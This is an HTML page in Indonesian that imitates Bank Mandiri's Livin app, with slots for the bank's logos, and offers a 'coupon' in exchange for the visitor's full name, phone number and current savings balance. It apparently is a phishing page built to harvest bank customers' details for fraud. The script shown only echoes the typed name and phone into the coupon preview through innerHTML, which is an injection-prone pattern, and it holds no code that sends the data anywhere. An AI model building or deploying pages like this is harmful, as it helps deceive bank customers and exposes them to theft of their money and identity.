
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Kupon Livin</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,sans-serif;
}

body{
background:#ececec;
max-width:430px;
margin:auto;
overflow-x:hidden;
}

/* HEADER */

.topbar{
height:110px;
background:#0d84e8;
display:flex;
align-items:center;
justify-content:space-between;
padding:0 25px;
}

.topbar img{
height:45px;
object-fit:contain;
}

/* CONTENT */

.content{
padding:20px;
}

.title{
text-align:center;
font-size:22px;
font-weight:700;
color:#1d7fd4;
margin-bottom:20px;
}

/* CARD */

.card{
background:white;
border-radius:25px;
padding:25px;
border:2px solid #9bb7cb;
box-shadow:0 5px 15px rgba(0,0,0,.15);
}

/* KUPON */

.kupon-wrapper{
position:relative;
width:100%;
margin-bottom:25px;
}

.kupon-bg{
width:100%;
display:block;
border-radius:20px;
}

.ticket{
position:absolute;
left:50%;
top:53%;
transform:translate(-50%,-50%);
width:78%;
}

.ticket img{
width:100%;
display:block;
}

.nama{
position:absolute;
left:11%;
top:25%;
font-size:24px;
font-weight:bold;
color:#1246c9;
}

.hp{
position:absolute;
left:11%;
top:62%;
font-size:24px;
font-weight:bold;
color:white;
}

/* LABEL */

label{
display:block;
font-size:18px;
font-weight:700;
color:#2584d6;
margin-bottom:8px;
margin-top:12px;
}

input{
width:100%;
height:60px;
border:3px solid #2592e8;
border-radius:14px;
padding:0 20px;
font-size:20px;
box-shadow:0 10px 20px rgba(0,0,0,.12);
outline:none;
}

input::placeholder{
color:#c2c2c2;
}

.btn{
margin-top:30px;
height:65px;
border:none;
width:100%;
border-radius:40px;
background:#c4e0ff;
font-size:22px;
font-weight:bold;
color:white;
}

/* NAVBAR */

.navbar{
position:fixed;
bottom:0;
left:50%;
transform:translateX(-50%);
width:100%;
max-width:430px;
height:95px;
background:white;
display:flex;
justify-content:space-around;
align-items:center;
box-shadow:0 -5px 15px rgba(0,0,0,.1);
}

.nav-item{
font-size:14px;
text-align:center;
color:#666;
}

.nav-item img{
width:35px;
display:block;
margin:auto;
margin-bottom:4px;
}

.qris-btn{
width:75px;
height:75px;
background:#4eb3ff;
border-radius:20px;
display:flex;
justify-content:center;
align-items:center;
margin-top:-35px;
box-shadow:0 5px 15px rgba(0,0,0,.2);
}

.qris-btn img{
width:60px;
}

.spacer{
height:120px;
}

</style>
</head>
<body>

<div class="topbar">

<!-- LOGO BUMN -->
<img src="" alt="BUMN">

<!-- LOGO MANDIRI -->
<img src="" alt="Mandiri">

</div>

<div class="content">

<div class="title">
Lengkapi data Pencetakan Kupon
</div>

<div class="card">

<div class="kupon-wrapper">

<!-- BACKGROUND PANJANG LIVIN -->
<img src="" class="kupon-bg">

<div class="ticket">

<!-- GAMBAR KUPON -->
<img src="" alt="Kupon">

<div class="nama">
NAMA =
</div>

<div class="hp">
No.HP =
</div>

</div>

</div>

<label>Nama Lengkap Nasabah</label>
<input
id="nama"
placeholder="Masukan Nama Lengkap">

<label>Nomor Handphone</label>
<input
id="hp"
placeholder="Masukan Nomor Handphone">

<label>Saldo Rekening Tabungan saat Ini</label>
<input
id="saldo"
placeholder="Sisa Saldo">

<button class="btn">
DAFTAR KUPON
</button>

</div>

</div>

<div class="spacer"></div>

<div class="navbar">

<div class="nav-item">
<img src="">
Beranda
</div>

<div class="nav-item">
<img src="">
Produk Anda
</div>

<div class="qris-btn">

<!-- ICON QRIS TENGAH -->
<img src="">

</div>

<div class="nav-item">
<img src="">
QRIS
</div>

<div class="nav-item">
<img src="">
Promo
</div>

</div>

<script>

const nama = document.getElementById('nama');
const hp = document.getElementById('hp');

nama.addEventListener('input',()=>{
document.querySelector('.nama').innerHTML =
'NAMA = ' + nama.value;
});

hp.addEventListener('input',()=>{
document.querySelector('.hp').innerHTML =
'No.HP = ' + hp.value;
});

</script>

</body>
</html>
